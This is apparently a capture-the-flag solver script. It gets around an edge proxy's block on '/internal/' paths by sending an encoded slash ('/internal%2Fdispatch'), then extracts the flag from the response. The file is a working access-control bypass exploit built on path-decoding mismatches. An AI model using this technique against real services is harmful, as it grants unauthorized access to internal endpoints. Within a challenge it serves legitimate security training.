#!/usr/bin/env python3
"""Dispatch solver: ask for the console with one encoded character."""

import argparse
import re
import sys
import urllib.error
import urllib.request

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")
# The edge refuses a target that starts with "/internal/". The application
# unquotes the raw request target before routing, so an encoded slash reaches
# the console. An encoded "i" (%69) does not survive: the HTTP proxy in front
# of the instance decodes it and the edge sees the plain prefix.
CONSOLE_PATH = "/internal%2Fdispatch"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    args = parser.parse_args()

    url = args.base_url.rstrip("/") + CONSOLE_PATH
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            body = response.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as error:
        print(f"solver: request failed: {error}", file=sys.stderr)
        return 1

    match = FLAG.search(body)
    if not match:
        print("solver: no flag in the response", file=sys.stderr)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
